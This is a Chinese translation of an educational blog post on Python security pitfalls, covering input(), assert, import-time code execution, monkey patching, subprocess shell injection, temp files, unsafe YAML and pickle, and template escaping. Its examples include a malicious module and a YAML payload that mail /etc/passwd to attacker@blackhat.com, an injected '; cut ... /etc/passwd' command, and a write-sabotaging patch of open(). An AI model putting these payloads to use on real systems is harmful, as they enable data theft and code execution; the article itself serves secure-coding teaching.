> 原文链接: https://www.anquanke.com//post/id/84559 


# 【技术分享】关于Python漏洞挖掘那些不得不提的事儿


                                阅读量   
                                **129123**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：安全客
                                <br>原文地址：[https://access.redhat.com/blogs/766093/posts/2592591](https://access.redhat.com/blogs/766093/posts/2592591)

译文仅供参考，具体内容表达以及含义原文为准



**[![](https://p1.ssl.qhimg.com/t0117613f80cb3b3b1d.png)](https://p1.ssl.qhimg.com/t0117613f80cb3b3b1d.png)**

**<br>**

**前言**

******Python因其在开发更大、更复杂应用程序方面独特的便捷性，使得它在计算机环境中变得越来越不可或缺。虽然其明显的语言清晰度和使用友好度使得软件工程师和系统管理员放下了戒备，但是他们的编码错误还是有可能会带来严重的安全隐患。**

****这篇文章的主要受众是还不太熟悉Python的人，其中会提及少量与安全有关的行为以及有经验开发人员遵循的规则。<br>

<br>

**输入函数**

在Python2强大的内置函数中，输入函数完全就是一个大的安全隐患。一旦调用输入函数，任何从stdin中读取的数据都会被认定为Python代码： 

```
$ python2
    &gt;&gt;&gt; input()
    dir()
    ['__builtins__', '__doc__', '__name__', '__package__']
   &gt;&gt;&gt; input()
   __import__('sys').exit()
   $
```

  显然，只要脚本stdin中的数据不是完全可信的，输入函数就是有危险的。Python 2 文件将 raw_input 认定为一个安全的选择。在Python3中，输入函数相当于是 raw_input，这样就可以完全修复这一问题。

<br>

**assert语句**

  还有一条使用 assert 语句编写的代码语句，作用是捕捉 Python 应用程序中下一个不可能条件。



```
def verify_credentials(username, password):
       assert username and password, 'Credentials not supplied by caller'
       ... authenticate possibly null user with null password ...
```

然而，Python在编译源代码到优化的字节代码 (如 python-O) 时不会有任何的assert 语句说明。这样的移除使得程序员编写用来抵御攻击的代码保护都形同虚设。

这一弱点的根源就是assert机制只是用于测试，就像是c++语言中那样。程序员必须使用其他手段才能确保数据的一致性。

<br>

**可重用整数**

  在Python中一切都是对象，每一个对象都有一个可以通过 id 函数读取的唯一标示符。可以使用运算符弄清楚是否有两个变量或属性都指向相同的对象。整数也是对象，所以这一操作实际上是一种定义：



```
&gt;&gt;&gt; 999+1 is 1000
    False
```

上述操作的结果可能会令人大吃一惊，但是要提醒大家的是这样的操作是同时使用两个对象标示符，这一过程中并不会比较它们的数值或是其它任何值。但是：



```
&gt;&gt;&gt; 1+1 is 2
    True
```

对于这种行为的解释就是Python当中有一个对象集合，代表了最开始的几百个整数，并且会重利用这些整数以节省内存和对象创建。更加令人疑惑的就是，不同的Python版本对于“小整数”的定义是不一样的。

这里所指的缓存永远不会使用运算符进行数值比较，运算符也专门是为了处理对象标示符。

<br>

**浮点数比较**

处理浮点数可能是一件更加复杂的工作，因为十进制和二进制在表示分数的时候会存在有限精度的问题。导致混淆的一个常见原因就是浮点数对比有时候可能会产生意外的结果。下面是一个著名的例子：



```
&gt;&gt;&gt; 2.2 * 3.0 == 3.3 * 2.0
   False
```

这种现象的原因是一个舍入错误：



```
&gt;&gt;&gt; (2.2 * 3.0).hex()
   '0x1.a666666666667p+2'
   &gt;&gt;&gt; (3.3 * 2.0).hex()
   '0x1.a666666666666p+2'
```

另一个有趣的发现就是Python float 类型支持无限概念。一个可能的原因就是任何数都要小于无限：



```
&gt;&gt;&gt; 10**1000000 &gt; float('infinity')
   False
```

但是在Python3中，有一种类型的对象不支持无限：



```
 &gt;&gt;&gt; float &gt; float('infinity')
   True
```

一个最好的解决办法就是坚持使用整数算法，还有一个办法就是使用十进制内核模块，这样可以为用户屏蔽烦人的细节问题和缺陷。

一般来说，只要有任何算术运算就必须要小心舍入错误。详情可以参阅 Python 文档中的《发布和局限性》一章。

<br>

**私有属性**

Python 不支持隐藏的对象属性。但还有一种变通方法，那就是基于特征的错位双下划线属性。虽然更改属性名称只会作用于代码，硬编码到字符串常量的属性名称仍未被修改。双下划线属性明显"隐藏在" getattr()/hasattr() 函数时可能会导致混乱的行为。



```
&gt;&gt;&gt; class X(object):
   ...   def __init__(self):
   ...     self.__private = 1
   ...   def get_private(self):
   ...     return self.__private
   ...   def has_private(self):
   ...     return hasattr(self, '__private')
   ... 
   &gt;&gt;&gt; x = X()
   &gt;&gt;&gt;
   &gt;&gt;&gt; x.has_private()
   False
   &gt;&gt;&gt; x.get_private()
   1
```

此隐藏属性功能不适用于没有类定义的属性，这有效地在引用中“分裂”了任何给定的属性：



```
&gt;&gt;&gt; class X(object):
   ...   def __init__(self):
   ...     self.__private = 1
   &gt;&gt;&gt;
   &gt;&gt;&gt; x = X()
   &gt;&gt;&gt;
   &gt;&gt;&gt; x.__private
   Traceback
   ...
   AttributeError: 'X' object has no attribute '__private'
   &gt;&gt;&gt;
   &gt;&gt;&gt; x.__private = 2
   &gt;&gt;&gt; x.__private
   2
   &gt;&gt;&gt; hasattr(x, '__private')
   True
```

如果一个程序员过度依赖自己的代码而不关注私有属性的不对称双下划线属性，有可能会造成极大的安全隐患。

<br>

**模块注入**

Python 模块注入系统是强大而复杂的。在搜索路径中找到由 sys.path 列表定义的文件或目录名称可以导入模块和包。搜索路径初始化是一个复杂的过程，这一过程依赖于 Python 版本、 平台和本地配置。要在一个 Python 应用程序上实行一次成功攻击，攻击者需要找到方式将恶意 Python 模块放入目录或可注入的包文件，以确保Python 可能会在尝试导入模块时“中招”。

解决方法是保持对所有目录和软件包文件搜索路径的安全访问权限，以确保未经授权的用户没有访问权限。需要记住的是，最初脚本调用 Python 解释器所在的目录会自动插入到搜索路径。

运行类似于下面的脚本显示实际的搜索路径︰



```
$ cat myapp.py
   #!/usr/bin/python
   import sys
   import pprint
   pprint.pprint(sys.path)
```

Python 程序的当前工作目录被注入的搜索路径是在 Windows 平台上，而不是脚本位置 。在 UNIX 平台上，每当从 stdin 或命令行读取程序代码 ("-"或"-c"或"-m"选项)时，当前的工作目录都会自动插入到 sys.path :



```
$ echo "import sys, pprint; pprint.pprint(sys.path)" | python -
   ['',
    '/usr/lib/python3.3/site-packages/pip-7.1.2-py3.3.egg',
    '/usr/lib/python3.3/site-packages/setuptools-20.1.1-py3.3.egg',
    ...]
   $ python -c 'import sys, pprint; pprint.pprint(sys.path)'
   ['',
    '/usr/lib/python3.3/site-packages/pip-7.1.2-py3.3.egg',
    '/usr/lib/python3.3/site-packages/setuptools-20.1.1-py3.3.egg',
    ...]
   $
   $ cd /tmp
   $ python -m myapp
   ['',
    '/usr/lib/python3.3/site-packages/pip-7.1.2-py3.3.egg',
    '/usr/lib/python3.3/site-packages/setuptools-20.1.1-py3.3.egg',
    ...]
```

通过命令行在 Windows 或通过代码上运行 Python的一个优先建议就是，明确从当前工作目录更改到一个安全目录时存在的模块注入风险。

搜索路径的另一个可能来源是 $PYTHONPATH 环境变量的内容。从过程环境对 sys.path 的方便缓存是通过 Python 解释器，因为它会忽视 $PYTHONPATH 变量的-E 选项。

<br>

**导入代码执行**

虽然看得不明显，但是导入语句实际上会导致正在导入模块中的代码执行。这就是为什么即使只是导入不信任模块都是有风险的。导入一个下面这种的简单模块都可能会导致不愉快的后果︰



```
$ cat malicious.py
   import os
   import sys
   os.system('cat /etc/passwd | mail attacker@blackhat.com')
   del sys.modules['malicious']  # pretend it's not imported
   $ python
   &gt;&gt;&gt; import malicious
   &gt;&gt;&gt; dir(malicious)
   Traceback (most recent call last):
   NameError: name 'malicious' is not defined
```

如果攻击者结合 sys.path 条目注入进行攻击，就有可能进一步破解系统。

<br>

**猴子补丁**

在运行时更改Python 对象属性的过程被称为猴子补丁。Python 是一种动态语言，完全支持在运行时更改程序和代码。一旦恶意模块通过某种方式进入其中，任何现有的可变对象都有可能在不知不觉中被恶意修改。考虑以下情况︰ 

```
$ cat nowrite.py
   import builtins
   def malicious_open(*args, **kwargs):
      if len(args) &gt; 1 and args[1] == 'w':
         args = ('/dev/null',) + args[1:]
      return original_open(*args, **kwargs)
   original_open, builtins.open = builtins.open, malicious_open
```

如果上面的代码被 Python 解释器执行，那么一切写入文件都不会被存储到文件系统中︰

```
&gt;&gt;&gt; import nowrite
   &gt;&gt;&gt; open('data.txt', 'w').write('data to store')
   5
   &gt;&gt;&gt; open('data.txt', 'r')
   Traceback (most recent call last):
   ...
   FileNotFoundError: [Errno 2] No such file or directory: 'data.txt'
```

攻击者可以利用 Python 垃圾回收器 (gc.get_objects()) 掌握所有现有对象，并破解任意对象。

**在 Python 2中**， 内置对象可以通过魔法 __builtins__ 模块进行访问。一个已知的手段就是利用 __builtins__ 的可变性，这可能引起巨大灾难︰ 

```
&gt;&gt;&gt; __builtins__.False, __builtins__.True = True, False
   &gt;&gt;&gt; True
   False
   &gt;&gt;&gt; int(True)
   0
```

**在 Python 3中**， 对真假的赋值不起作用，所以攻击者不能操纵这种方式进行攻击。

函数在 Python 中是一类对象，它们保持对许多函数属性的引用。尤其是通过 __code__ 属性引用可执行字节码，当然，可以对这一属性进行修改︰ 

```
  &gt;&gt;&gt; import shutil
   &gt;&gt;&gt;
   &gt;&gt;&gt; shutil.copy
   &lt;function copy at 0x7f30c0c66560&gt;
   &gt;&gt;&gt; shutil.copy.__code__ = (lambda src, dst: dst).__code__
   &gt;&gt;&gt;
   &gt;&gt;&gt; shutil.copy('my_file.txt', '/tmp')
   '/tmp'
   &gt;&gt;&gt; shutil.copy
   &lt;function copy at 0x7f30c0c66560&gt;
   &gt;&gt;&gt;
```

一旦应用上述的猴子修补程序，尽管 shutil.copy 函数看上去仍然可用，但其实它已经默默地停止工作了，这是因为没有 op lambda 函数代码为它设置。

Python 对象的类型是由 __class__ 属性决定的。邪恶的攻击者可能会改变现有对象的类型来“搞破坏”：

```
&gt;&gt;&gt; class X(object): pass
   ... 
   &gt;&gt;&gt; class Y(object): pass
   ... 
   &gt;&gt;&gt; x_obj = X()
   &gt;&gt;&gt; x_obj
   &lt;__main__.X object at 0x7f62dbe5e010&gt;
   &gt;&gt;&gt; isinstance(x_obj, X)
   True
   &gt;&gt;&gt; x_obj.__class__ = Y
   &gt;&gt;&gt; x_obj
   &lt;__main__.Y object at 0x7f62dbe5d350&gt;
   &gt;&gt;&gt; isinstance(x_obj, X)
   False
   &gt;&gt;&gt; isinstance(x_obj, Y)
   True
   &gt;&gt;&gt;
```

针对恶意猴子修补唯一的解决方法就是确保导入的Python 模块是真实完整的 。

<br>

**通过子进程进行外壳注入**

Python也被称为是一种胶水语言，所以对于Python脚本来说，将系统管理任务委派给其他程序通过询问操作系统来执行它们是很常见的，这样的过程还可能会提供额外的参数。对于这样的任务来说，提供子进程模块会更易于使用：

```
 &gt;&gt;&gt; from subprocess import call
   &gt;&gt;&gt;
   &gt;&gt;&gt; unvalidated_input = '/bin/true'
   &gt;&gt;&gt; call(unvalidated_input)
   0
```

但这里面有蹊跷！为了使用 UNIX 外壳服务（如扩展命令行参数），壳关键字调用函数的参数应该变成真。然后调用函数的第一个参数作为传递，以方便系统外壳进一步进行分析和解释。一旦调用函数 （或其他子进程模块中实现的函数）获得未经验证的用户输入，底层系统资源就变得无遮无拦了。

```
  &gt;&gt;&gt; from subprocess import call
   &gt;&gt;&gt;
   &gt;&gt;&gt; unvalidated_input = '/bin/true'
   &gt;&gt;&gt; unvalidated_input += '; cut -d: -f1 /etc/passwd'
   &gt;&gt;&gt; call(unvalidated_input, shell=True)
   root
   bin
   daemon
   adm
   lp
   0
```

显然更安全的做法就是将外壳关键字保持在其默认的虚假状态，并且提供一个命令向量和子进程函数参数，这样就可以不引用 UNIX 外壳执行外部命令。在第二次的调用形式中，外壳程序不会扩展其参数或是指令。

```
  &gt;&gt;&gt; from subprocess import call
   &gt;&gt;&gt;
   &gt;&gt;&gt; call(['/bin/ls', '/tmp'])
```

如果应用程序的性质决定必须使用 UNIX 外壳服务，那么保证一切子流程没有多余的外壳功能可以被恶意用户加以利用是十分重要。在较新的 Python 版本中，标准库中的 shlex.quote 函数可以应对外壳逃逸。

<br>

**临时文件**

虽然只有对临时文件的不当使用才会引起编程语言故障，但是在 Python 脚本中存在惊人的相似情况，所以还是值得一提的。

这种漏洞可能会导致对文件系统访问权限的不安全利用，其中可能会涉及到中间步骤，最终导致数据机密性或完整性的安全问题。一般问题的详细描述可以在 CWE 377中找到。

幸运的是，Python 附带的标准库中有临时文件模块，它会提供可以"以最安全的方式"创建临时文件名称的高级函数。不过 tempfile.mktemp 执行还是有缺陷的，因为库的向后兼容性问题仍然存在。还有一点，那就是永远不要使用 tempfile.mktemp 功能，而是在不得不使用文件的时候使用临时文件、TemporaryFile 或 tempfile.mkstemp 。

意外引入一个缺陷的另一种可能性是使用 shutil.copyfile 函数。这里的问题是该目标文件可能是以最不安全的方式创建的。

精通安全的开发人员可能会考虑首先将源文件复制到随机的临时文件名称，然后以最终名称重命名临时文件。虽然这可能看起来像是一个好主意，但是如果由 shutil.move 函数执行重命名就还是不安全的。问题就是，如果临时文件没有创建在最终文件存储的文件系统，那么 shutil.move 将无法以原子方式 （通过 os.rename) 移动它，只会默认将其移动到不安全的 shutil.copy。解决办法就是使用 os.rename 而不是 shutil.move os.rename，因为这注定没办法跨越文件系统边界。

进一步的并发隐患就是 shutil.copy 无法复制所有文件元数据，这可能会导致创建的文件不受保护。

不仅限于 Python，所有的语言中都要小心修改远程文件系统上的文件类型。数据一致性保证往往会很据文件访问序列化的不同而产生差异。举例来说，NFSv2 不承认开放系统调用的 O_EXCL 标示符，但这是创建原子文件的关键。

<br>

**不安全的反序列化**

存在许多数据序列化方法，其中Pickle的具体目的是序列化 Python 对象。其目标是将可用的 Python 对象转储到八位字节流以供存储或传输，然后将其重建到另一个 Python 实例。重建步骤本身就存在风险，因为这可能会导致序列化的数据被篡改。Pickle的不安全性是公认的，Python 文档中也明确指出了。

作为一种流行的配置文件格式，YAML 有时候也被看作一种强大的序列化协议，能够诱骗反序列化程序执行任意代码。更危险的是 Python-PyYAML 事实上默认 YAML 执行看似无害的反序列化︰

```
&gt;&gt;&gt; import yaml
   &gt;&gt;&gt;
   &gt;&gt;&gt; dangerous_input = """
   ... some_option: !!python/object/apply:subprocess.call
   ...   args: [cat /etc/passwd | mail attacker@blackhat.com]
   ...   kwds: `{`shell: true`}`
   ... """
   &gt;&gt;&gt; yaml.load(dangerous_input)
   `{`'some_option': 0`}`
```

建议的修复方法就是永远都使用 yaml.safe_load 来处理你不能信任的 YAML 序列化。尽管如此，考虑其他序列化库倾向于使用转储/加载函数名称来满足类似用途，当前的PyYAML 默认还是感觉有点挑衅意味。

<br>

**模块化引擎**

Web 应用程序的作者很久以前就开始使用Python了 ，过去十年开发出了大量的 Web 框架。很多人开始利用模板引擎生成动态 web 内容。除了 web 应用程序，模板引擎还在一些完全不同的软件中找到了自己存在的价值，比如说安塞波它自动化工具。

从静态模板和运行变量中呈现内容时，还是存在通过运行变量进行用户控制代码注入的风险。成功安装的 web 应用程序攻击可能会导致跨站点脚本漏洞。针对服务器端模板注入攻击的通常解决办法是在进入最终文件之前清除模板变量内容，具体做法就是否认、 剥离对于给定标记或其他特定于域的语言而言任何的奇怪转义字符。

不幸的是，模板化引擎不能保证更加严格的安全性。现在最常用的做法中没有一种默认使用转义机制，主要依靠的还是开发人员对风险的认识。

例如现在最流行的工具之一，Jinja2所呈现的一切︰

```
 &gt;&gt;&gt; from jinja2 import Environment
   &gt;&gt;&gt;
   &gt;&gt;&gt; template = Environment().from_string('')
   &gt;&gt;&gt; template.render(variable='&lt;script&gt;do_evil()&lt;/script&gt;')
   '&lt;script&gt;do_evil()&lt;/script&gt;'
  ......除非多种可能的转义机制中存在一种可以通过改变其默认设置来显现：
   &gt;&gt;&gt; from jinja2 import Environment
   &gt;&gt;&gt;
   &gt;&gt;&gt; template = Environment(autoescape=True).from_string('')
   &gt;&gt;&gt; template.render(variable='&lt;script&gt;do_evil()&lt;/script&gt;')
   '&lt;script&gt;do_evil()&lt;/script&gt;'
```

更复杂的问题是，在某些使用情况下，程序员不想清除所有的模板变量，而是需要保持其中一些成分不变。这就需要引入"筛选器"模板化引擎地址，能够让程序员选择需要清除的个体变量内容。Jinja2 还在每个模板的基础上提供了一种切换默认逃逸值的选项。

如果开发人员避开了一个语言标记集合，那么代码就会变得更加不安全，可能会导致攻击者直接进入最终文件。

<br>

**结语**

这篇博客不是为了列出Python中存在的所有潜在陷阱和缺陷，而是为了大家提高对于安全风险的认识，希望编程变得更加愉快、生活更加安全。
